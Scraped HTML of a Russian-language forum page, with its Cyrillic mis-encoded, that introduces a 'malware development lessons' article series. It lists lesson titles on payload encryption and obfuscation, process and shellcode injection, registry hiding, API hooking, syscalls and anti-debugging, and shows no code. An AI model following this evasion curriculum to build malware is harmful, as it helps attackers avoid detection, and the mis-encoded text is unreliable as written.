					
    <a href="https://osint42.org/misc/style-variation"
       class="p-navgroup-link p-navgroup-link--iconic js-styleVariationsLink"
       data-xf-click="menu"
       data-menu-pos-ref="< .p-navgroup"
       aria-label=" –í—ã–±–æ—Ä —Å—Ç–∏–ª—è"
       aria-expanded="false"
       aria-haspopup="true"
       title=" –í—ã–±–æ—Ä —Å—Ç–∏–ª—è">
        <i aria-hidden="true">
            <i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
        </i>
        <span class="p-navgroup-linkText"> –í—ã–±–æ—Ä —Å—Ç–∏–ª—è</span>
    </a>

    <div class="menu menu--structural" data-menu="menu" aria-hidden="true">
        <div class="menu-content js-styleVariationsMenu">
            

	
		

	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="">

		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>

		
			–°–∏—Å—Ç–µ–º–Ω—ã–π
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="default">

		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>

		
			–°–≤–µ—Ç–ª—ã–π
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow is-selected"
		rel="nofollow"
		data-xf-click="style-variation" data-variation="alternate">

		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>

		
			–¢—ë–º–Ω—ã–π
		
	</a>

	

	
		
	

        </div>
    </div>



					<div class="p-navgroup p-discovery">
						<a href="../../whats-new/index.html"
							

	class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--whatsnew"

							aria-label="–ß—Ç–æ –Ω–æ–≤–æ–≥–æ"
							title="–ß—Ç–æ –Ω–æ–≤–æ–≥–æ">
							<i aria-hidden="true"></i>
							<span class="p-navgroup-linkText">–ß—Ç–æ –Ω–æ–≤–æ–≥–æ</span>
						</a>

						
							<a href="../../search/index.html"
								class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--search"
								data-xf-click="menu"
								data-xf-key="/"
								aria-label="–ü–æ–∏—Å–∫"
								aria-expanded="false"
								aria-haspopup="true"
								title="–ü–æ–∏—Å–∫">
								<i aria-hidden="true"></i>
								<span class="p-navgroup-linkText">–ü–æ–∏—Å–∫</span>
							</a>
							<div class="menu menu--structural menu--wide" data-menu="menu" aria-hidden="true">
								<form action="https://osint42.org/search/search" method="post"
									class="menu-content"
									data-xf-init="quick-search">

									<h3 class="menu-header">–ü–æ–∏—Å–∫</h3>
									
									<div class="menu-row">
										
											<div class="inputGroup inputGroup--joined">
												<input type="text" class="input" name="keywords" data-acurl="/search/auto-complete" placeholder="–ü–æ–∏—Å–∫..." aria-label="–ü–æ–∏—Å–∫" data-menu-autofocus="true" />
												
			<select name="constraints" class="js-quickSearch-constraint input" aria-label="–ü–æ–∏—Å–∫ –≤">
				<option value="">–í–µ–∑–¥–µ</option>
<option value="{&quot;search_type&quot;:&quot;ams_article&quot;}">–°—Ç–∞—Ç—å–∏</option>
<option value="{&quot;search_type&quot;:&quot;ams_article&quot;,&quot;c&quot;:{&quot;categories&quot;:[2],&quot;child_categories&quot;:1}}">–≠—Ç–∞ –∫–∞—Ç–µ–≥–æ—Ä–∏—è</option>

			</select>
		
											</div>
										
									</div>

									
									<div class="menu-row">
										<label class="iconic"><input type="checkbox"  name="c[title_only]" value="1" /><i aria-hidden="true"></i><span class="iconic-label">–ò—Å–∫–∞—Ç—å —Ç–æ–ª—å–∫–æ –≤ –∑–∞–≥–æ–ª–æ–≤–∫–∞—Ö

													
													<span tabindex="0" role="button"
														data-xf-init="tooltip" data-trigger="hover focus click" title="–¢–µ–≥–∏ —Ç–∞–∫–∂–µ –±—É–¥—É—Ç —É—á–∏—Ç—ã–≤–∞—Ç—å—Å—è">

														<i class="fa--xf far fa-question-circle  u-muted u-smaller"><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#question-circle"></use></svg></i>
													</span></span></label>

									</div>
									
									<div class="menu-row">
										<div class="inputGroup">
											<span class="inputGroup-text" id="ctrl_search_menu_by_member">–ê–≤—Ç–æ—Ä:</span>
											<input type="text" class="input" name="c[users]" data-xf-init="auto-complete" placeholder="–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å" aria-labelledby="ctrl_search_menu_by_member" />
										</div>
									</div>
									<div class="menu-footer">
									<span class="menu-footer-controls">
										<button type="submit" class="button button--icon button--icon--search button--primary"><i class="fa--xf far fa-search "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#search"></use></svg></i><span class="button-text">–ù–∞–π—Ç–∏</span></button>
										<button type="submit" class="button " name="from_search_menu"><span class="button-text">–†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π –ø–æ–∏—Å–∫...</span></button>
									</span>
									</div>

									<input type="hidden" name="_xfToken" value="1758965544,d4a329dfc08dc36ef8d644381e10fee9" />
								</form>
							</div>
						
					</div>
				</div>
			</div>
		</nav>
	
		</div>
		
		
			<div class="p-sectionLinks">
				<div class="p-sectionLinks-inner hScroller" data-xf-init="h-scroller">
					<div class="hScroller-scroll">
						<ul class="p-sectionLinks-list">
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../whats-new/ams-articles/index.html"
	class="p-navEl-link "
	 rel="nofollow"
	data-xf-key="alt+1"
	data-nav-id="xa_amsNewArticles">–ù–æ–≤—ã–µ —Å—Ç–∞—Ç—å–∏</a>


		

		
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../whats-new/ams-comments/index.html"
	class="p-navEl-link "
	 rel="nofollow"
	data-xf-key="alt+2"
	data-nav-id="xa_amsNewComments">–ù–æ–≤—ã–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏</a>


		

		
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../authors/index.html"
	class="p-navEl-link "
	
	data-xf-key="alt+3"
	data-nav-id="xa_amsAuthorList">–°–ø–∏—Å–æ–∫ –∞–≤—Ç–æ—Ä–æ–≤</a>


		

		
	
	</div>

								</li>
							
						</ul>
					</div>
				</div>
			</div>
			
	
		

	<div class="offCanvasMenu offCanvasMenu--nav js-headerOffCanvasMenu" data-menu="menu" aria-hidden="true" data-ocm-builder="navigation">
		<div class="offCanvasMenu-backdrop" data-menu-close="true"></div>
		<div class="offCanvasMenu-content">
			<div class="offCanvasMenu-header">
				–ú–µ–Ω—é
				<a class="offCanvasMenu-closer" data-menu-close="true" role="button" tabindex="0" aria-label="–ó–∞–∫—Ä—ã—Ç—å"></a>
			</div>
			
				<div class="p-offCanvasRegisterLink">
					<div class="offCanvasMenu-linkHolder">
						<a href="../../login/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
							–í—Ö–æ–¥
						</a>
					</div>
					<hr class="offCanvasMenu-separator" />
					
						<div class="offCanvasMenu-linkHolder">
							<a href="../../register/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
								–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è
							</a>
						</div>
						<hr class="offCanvasMenu-separator" />
					
				</div>
			
			<div class="js-offCanvasNavTarget"></div>
			<div class="offCanvasMenu-installBanner js-installPromptContainer" style="display: none;" data-xf-init="install-prompt">
				<div class="offCanvasMenu-installBanner-header">–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</div>
				<button type="button" class="button js-installPromptButton"><span class="button-text">–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å</span></button>
				<template class="js-installTemplateIOS">
					<div class="js-installTemplateContent">
						<div class="overlay-title">–ö–∞–∫ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ iOS</div>
						<div class="block-body">
							<div class="block-row">
								<p>
									–°–ª–µ–¥—É–π—Ç–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è–º –≤ –≤–∏–¥–µ–æ –Ω–∏–∂–µ, —á—Ç–æ–±—ã —É–∑–Ω–∞—Ç—å, –∫–∞–∫ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω–∞—à —Å–∞–π—Ç –∫–∞–∫ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ –≥–ª–∞–≤–Ω—ã–π —ç–∫—Ä–∞–Ω –≤–∞—à–µ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.
								</p>
								<p style="text-align: center">
									<video src="../../styles/default/xenforo/add_to_home_new.mp4"
										width="280" height="480" autoplay loop muted playsinline></video>
								</p>
								<p>
									<small><strong>–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:</strong> –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –±—Ä–∞—É–∑–µ—Ä–∞—Ö.</small>
								</p>
							</div>
						</div>
					</div>
				</template>
			</div>
		</div>
	</div>

	<div class="p-body">
		<div class="p-body-inner">
			<!--XF:EXTRA_OUTPUT-->


			
				
	
		
		

		<ul class="notices notices--block  js-notices"
			data-xf-init="notices"
			data-type="block"
			data-scroll-interval="6">

			
				
	<li class="notice js-notice notice--primary notice--hasImage"
		data-notice-id="1"
		data-delay-duration="0"
		data-display-duration="0"
		data-auto-dismiss=""
		data-visibility="">

		
			<div class="notice-image"><img src="../../data/assets/notice_images/c7eb1746-6291-4d37-b72b-8e3b5cfd1303.png" alt="" /></div>
		
		<div class="notice-content">
			
			<div class="block"
     style="border:1px solid #ccc;
            border-radius:8px;
            padding:min(4vw,15px);
            background:var(--xf-contentBg);
            box-shadow:0 0 8px rgba(0,0,0,.1);
            width:100%;
            max-width:clamp(480px,90vw,1200px);
            margin:0 auto;
            box-sizing:border-box;
            overflow:hidden;">

  <div class="block-container">
    <h3 class="block-header"
        style="font-size:clamp(1rem,4vw,1.125rem);
               margin:0 0 10px 0;">
      üì° –ö–æ–Ω—Ç–∞–∫—Ç—ã –∏ –ø–æ–∏—Å–∫ –ø–æ —Å–∞–π—Ç—É –≤ –Ø–Ω–¥–µ–∫—Å
    </h3>

    <div class="block-body" style="line-height:1.4;">

      <!-- Email -->
      <p style="margin:8px 0;">
        ‚úâÔ∏è Email:
        <a href="../../cdn-cgi/l/email-protection.html#7a13141c153a150913140e4e4854191517" style="color:#2ecc71;
                  font-weight:bold;
                  overflow-wrap:anywhere;
                  text-decoration:none;">
          <span class="__cf_email__" data-cfemail="3d54535b527d524e545349090f135e5250">[email&#160;protected]</span>
        </a>
      </p>

      <div class="ya-site-form ya-site-form_inited_no" data-bem="{&quot;action&quot;:&quot;https://yandex.ru/search/site/&quot;,&quot;arrow&quot;:false,&quot;bg&quot;:&quot;transparent&quot;,&quot;fontsize&quot;:12,&quot;fg&quot;:&quot;#000000&quot;,&quot;language&quot;:&quot;ru&quot;,&quot;logo&quot;:&quot;rb&quot;,&quot;publicname&quot;:&quot;–ü–æ–∏—Å–∫ –ø–æ osint42.com&quot;,&quot;suggest&quot;:true,&quot;target&quot;:&quot;_blank&quot;,&quot;tld&quot;:&quot;ru&quot;,&quot;type&quot;:2,&quot;usebigdictionary&quot;:true,&quot;searchid&quot;:13900241,&quot;input_fg&quot;:&quot;#000000&quot;,&quot;input_bg&quot;:&quot;#ffffff&quot;,&quot;input_fontStyle&quot;:&quot;normal&quot;,&quot;input_fontWeight&quot;:&quot;normal&quot;,&quot;input_placeholder&quot;:&quot;–ü–æ–∏—Å–∫ –ø–æ —Å–∞–π—Ç—É –≤ –Ø–Ω–¥–µ–∫—Å&quot;,&quot;input_placeholderColor&quot;:&quot;#000000&quot;,&quot;input_borderColor&quot;:&quot;#7f9db9&quot;}"><form action="https://yandex.ru/search/site/" method="get" target="_blank" accept-charset="utf-8"><input type="hidden" name="searchid" value="13900241"/><input type="hidden" name="l10n" value="ru"/><input type="hidden" name="reqenc" value=""/><input type="search" name="text" value=""/><input type="submit" value="–ù–∞–π—Ç–∏"/></form></div><style type="text/css">.ya-page_js_yes .ya-site-form_inited_no { display: none; }</style><script type="text/javascript">(function(w,d,c){var s=d.createElement('script'),h=d.getElementsByTagName('script')[0],e=d.documentElement;if((' '+e.className+' ').indexOf(' ya-page_js_yes ')===-1){e.className+=' ya-page_js_yes';}s.type='text/javascript';s.async=true;s.charset='utf-8';s.src=(d.location.protocol==='https:'?'https:':'http:')+'//site.yandex.net/v2.0/js/all.js';h.parentNode.insertBefore(s,h);(w[c]||(w[c]=[])).push(function(){Ya.Site.Form.init()})})(window,document,'yandex_site_callbacks');</script>
      <!-- Notice -->
      <p style="margin:15px 0 0;
                padding:10px;
                border-radius:6px;
                background:#ffeaea;
                color:#c0392b;
                font-weight:bold;
                text-align:center;">
        ‚ö†Ô∏è –≠—Ç–æ –∞—Ä—Ö–∏–≤ —Ñ–æ—Ä—É–º–∞, –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞ —Ä–µ—Å—É—Ä—Å–∞ –Ω–µ –ø–ª–∞–Ω–∏—Ä—É–µ—Ç—Å—è!
      </p>

    </div>
  </div>
</div>
		</div>
	</li>

			
		</ul>
	

			

			

			
			
	
		<ul class="p-breadcrumbs "
			itemscope itemtype="https://schema.org/BreadcrumbList">
			
				

				
				

				

				
				
					
					
	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
		<a href="../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
			<span itemprop="name">–£—Ä–æ–∫–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Å–æ—Ñ—Ç–∞</span>
		</a>
		<meta itemprop="position" content="1" />
	</li>

				
			
		</ul>
	

			

			
	<noscript class="js-jsWarning"><div class="blockMessage blockMessage--important blockMessage--iconic u-noJsOnly">JavaScript –æ—Ç–∫–ª—é—á—ë–Ω. –î–ª—è –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –Ω–∞—à–µ–≥–æ —Å–∞–π—Ç–∞, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–∫–ª—é—á–∏—Ç–µ JavaScript –≤ —Å–≤–æ—ë–º –±—Ä–∞—É–∑–µ—Ä–µ.</div></noscript>

			
	<div class="blockMessage blockMessage--important blockMessage--iconic js-browserWarning" style="display: none">–í—ã –∏—Å–ø–æ–ª—å–∑—É–µ—Ç–µ —É—Å—Ç–∞—Ä–µ–≤—à–∏–π –±—Ä–∞—É–∑–µ—Ä. –≠—Ç–æ—Ç –∏ –¥—Ä—É–≥–∏–µ —Å–∞–π—Ç—ã –º–æ–≥—É—Ç –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å—Å—è –≤ –Ω–µ–º –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ.<br />–ù–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–±–Ω–æ–≤–∏—Ç—å –±—Ä–∞—É–∑–µ—Ä –∏–ª–∏ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å <a href="https://www.google.com/chrome/" target="_blank" rel="noopener">–¥—Ä—É–≥–æ–π</a>.</div>


			
				<div class="p-body-header">
					
		<div class="contentRow contentRow--hideFigureNarrow">
			<div class="contentRow-main">
				<div class="p-title">
					<h1 class="p-title-value">
						
							
							–¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;
						
					</h1>
				</div>
				
					<div class="p-description">
						
							<ul class="listInline listInline--bullet">
								<li>
									<i class="fa--xf far fa-user "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>–ê–≤—Ç–æ—Ä</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#user"></use></svg></i>
									<span class="u-srOnly">–ê–≤—Ç–æ—Ä</span>
									
										<a href="https://osint42.org/members/0x42.1/" class="username  u-concealed" dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a>
									
								</li>
								
								<li>
									<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>–î–∞—Ç–∞ –ø—É–±–ª–∏–∫–∞—Ü–∏–∏</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
									<span class="u-srOnly">–î–∞—Ç–∞ –ø—É–±–ª–∏–∫–∞—Ü–∏–∏</span>

									<a href="index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-05-08T13:54:22+0300" data-timestamp="1746701662" data-date="08.05.2025" data-time="13:54" data-short="8 –ú–∞–π" title="08.05.2025 –≤ 13:54">08.05.2025</time></a>
								</li>
																
									<li>
										<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
										<span class="u-concealed">–û–±–Ω–æ–≤–ª–µ–Ω–æ</span>

										<time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 –ú–∞–π" title="09.05.2025 –≤ 16:44">09.05.2025</time>
									</li>
								
																
									<li>
										<i class="fa--xf far fa-hourglass "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Article read time</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#hourglass"></use></svg></i>
										<span class="u-srOnly">Article read time</span>

										398 min read
									</li>
								
								
								
									<li><span class="label label--accent">–†–µ–∫–æ–º–µ–Ω–¥—É–µ–º—ã–µ</span></li>
								
							</ul>
						
					</div>
				

				

	
		
	

			</div>
		</div>
	
				</div>
				

			<div class="p-body-main p-body-main--withSidebar ">
				
				<div class="p-body-contentCol"></div>
				
					<div class="p-body-sidebarCol"></div>
				

				

				<div class="p-body-content">
					
					<div class="p-body-pageContent">









	

	



	
	

	




	




	







	




	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	







	
		
		

		
			<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script class="js-extraPhrases" type="application/json">
			{
				"lightbox_close": "–ó–∞–∫—Ä—ã—Ç—å",
				"lightbox_next": "–°–ª–µ–¥—É—é—â–∞—è",
				"lightbox_previous": "–ü—Ä–µ–¥—ã–¥—É—â–∞—è",
				"lightbox_error": "–ó–∞–ø—Ä–æ—à–µ–Ω–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–≥—Ä—É–∂–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.",
				"lightbox_start_slideshow": "–ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–ª–∞–π–¥-—à–æ—É",
				"lightbox_stop_slideshow": "–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–ª–∞–π–¥-—à–æ—É",
				"lightbox_full_screen": "–ü–æ–ª–Ω—ã–π —ç–∫—Ä–∞–Ω",
				"lightbox_thumbnails": "–ú–∏–Ω–∏–∞—Ç—é—Ä—ã",
				"lightbox_download": "–°–∫–∞—á–∞—Ç—å",
				"lightbox_share": "–ü–æ–¥–µ–ª–∏—Ç—å—Å—è",
				"lightbox_zoom": "–£–≤–µ–ª–∏—á–∏—Ç—å",
				"lightbox_new_window": "–ù–æ–≤–æ–µ –æ–∫–Ω–æ",
				"lightbox_toggle_sidebar": "–ü–µ—Ä–µ–∫–ª—é—á–∏—Ç—å –±–æ–∫–æ–≤—É—é –ø–∞–Ω–µ–ª—å"
			}
			</script>
		
		
	


<div class="block">
	
		<div class="block-outer">
			<div class="block-outer-opposite">
			
				

	

	

	

	

	

	

	

	
		<div class="buttonGroup">
		
			

			
			
			
			

	

			
			
				<div class="buttonGroup-buttonWrapper">
					<button type="button" class="button button--link menuTrigger" data-xf-click="menu" aria-expanded="false" aria-haspopup="true" title="–ù–∞–≤–∏–≥–∞—Ü–∏—è –ø–æ —Å—Ç—Ä–∞–Ω–∏—Ü–∞–º"><span class="button-text">
						–û–ì–õ–ê–í–õ–ï–ù–ò–ï
					</span></button>
					<div class="menu" data-menu="menu" aria-hidden="true">
						<div class="menu-content">
							<h4 class="menu-header">–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</h4>

							<a href="index.html" class="menu-linkRow ">
								
									–ó–∞—á–µ–º –∏–∑—É—á–∞—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º ?
								
							</a>

							
								
									<a href="page/instrumenty.1/index.html" class="menu-linkRow ">
									 –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã</a>
								
									<a href="page/tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="menu-linkRow ">
									 –¢–∞–∫ –∫–∞–∫–æ–π-–∂–µ —è–∑—ã–∫ –≤—ã–±—Ä–∞—Ç—å !?</a>
								
									<a href="page/shpargalka-po-arkhitekture-vindy.3/index.html" class="menu-linkRow ">
									 –®–ø–∞—Ä–≥–∞–ª–∫–∞ –ø–æ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–µ –≤–∏–Ω–¥—ã</a>
								
									<a href="page/chto-takoye-payload-i-shell-code.5/index.html" class="menu-linkRow ">
									 –ß—Ç–æ —Ç–∞–∫–æ–µ payload –∏ shell code</a>
								
									<a href="page/izuchayem-dinamicheskiye-biblioteki.6/index.html" class="menu-linkRow ">
									 –ò–∑—É—á–∞–µ–º –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏</a>
								
									<a href="page/protsessy-windows.7/index.html" class="menu-linkRow ">
									 –ü—Ä–æ—Ü–µ—Å—Å—ã Windows</a>
								
									<a href="page/vidy-detektov.8/index.html" class="menu-linkRow ">
									 –í–∏–¥—ã –¥–µ—Ç–µ–∫—Ç–æ–≤</a>
								
									<a href="page/kuda-klast-nagruzku.9/index.html" class="menu-linkRow ">
									 –ö—É–¥–∞ –∫–ª–∞—Å—Ç—å –Ω–∞–≥—Ä—É–∑–∫—É ?</a>
								
									<a href="page/shifruyem-payload.10/index.html" class="menu-linkRow ">
									 –®–∏—Ñ—Ä—É–µ–º Payload</a>
								
									<a href="page/obfuskatsiya-payload.11/index.html" class="menu-linkRow ">
									 –û–±—Ñ—É—Å–∫–∞—Ü–∏—è Payload</a>
								
									<a href="page/lokal-nyi-zapusk-payload.12/index.html" class="menu-linkRow ">
									 –õ–æ–∫–∞–ª—å–Ω—ã–π –∑–∞–ø—É—Å–∫ Payload</a>
								
									<a href="page/in-yektsiya-v-protsess.13/index.html" class="menu-linkRow ">
									 –ò–Ω—å–µ–∫—Ü–∏—è –≤ –ø—Ä–æ—Ü–µ—Å—Å</a>
								
									<a href="page/in-yektsiya-shell-koda-v-protsess.14/index.html" class="menu-linkRow ">
									 –ò–Ω—ä–µ–∫—Ü–∏—è —à–µ–ª–ª-–∫–æ–¥–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å</a>
								
									<a href="page/razmeshchayem-payload-udalenno-na-servere.15/index.html" class="menu-linkRow ">
									 –†–∞–∑–º–µ—â–∞–µ–º Payload —É–¥–∞–ª–µ–Ω–Ω–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ</a>
								
									<a href="page/pryachem-payload-v-reyestre.16/index.html" class="menu-linkRow ">
									 –ü—Ä—è—á–µ–º Payload –≤ —Ä–µ–µ—Å—Ç—Ä–µ</a>
								
									<a href="page/razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="menu-linkRow ">
									 –†–∞–∑–±–æ—Ä–∫–∞ —Å —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–¥–ø–∏—Å—å—é –∑–≤–µ—Ä—å–∫–∞</a>
								
									<a href="page/izuchayem-tekhniku-thread-hijacking.18/index.html" class="menu-linkRow ">
									 –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Thread Hijacking</a>
								
									<a href="page/opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="menu-linkRow ">
									 –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ PID –Ω—É–∂–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∏–ª–∏ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</a>
								
									<a href="page/izuchayem-tekhniku-apc-injection.20/index.html" class="menu-linkRow ">
									 –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É APC Injection</a>
								
									<a href="page/vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="menu-linkRow ">
									 –í—ã–∑–æ–≤ –∫–æ–¥–∞ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</a>
								
									<a href="page/in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="menu-linkRow ">
									 –ò–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏</a>
								
									<a href="page/izuchayem-tekhniku-stomping-injection.23/index.html" class="menu-linkRow ">
									 –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Stomping Injection</a>
								
									<a href="page/kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="menu-linkRow ">
									 –ö–æ–Ω—Ç—Ä–æ–ª—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</a>
								
									<a href="page/izuchayem-tekhniku-spoofing.25/index.html" class="menu-linkRow ">
									 –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Spoofing</a>
								
									<a href="page/skrytiye-strok.26/index.html" class="menu-linkRow ">
									 –°–∫—Ä—ã—Ç–∏–µ —Å—Ç—Ä–æ–∫</a>
								
									<a href="page/izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="menu-linkRow ">
									 –ò–∑—É—á–∞–µ–º –∫—É–Ω–≥—Ñ—É-1. –°–∫—Ä—ã—Ç–∏–µ —Ç–∞–±–ª–∏—Ü—ã –∏–º–ø–æ—Ä—Ç–∞</a>
								
									<a href="page/kungfu-2-izuchayem-api-hooking.28/index.html" class="menu-linkRow ">
									 –ö—É–Ω–≥—Ñ—É-2.–ò–∑—É—á–∞–µ–º API Hooking</a>
								
									<a href="page/predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="menu-linkRow ">
									 –ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞. –†–∞–∑–±–æ—Ä–∫–∞ —Å —Å–∏—Å–∫–æ–ª–∞–º–∏</a>
								
									<a href="page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html" class="menu-linkRow ">
									 –ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞-2. –ü—Ä–∞–∫—Ç–∏–∫–∞. –†–µ–∞–ª–∏–∑—É–µ–º —Ç–µ—Ö–Ω–∏–∫–∏ –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ —Å–∏—Å–∫–æ–ª—ã</a>
								
									<a href="page/cherpayem-sily-v-antiotladke.31/index.html" class="menu-linkRow ">
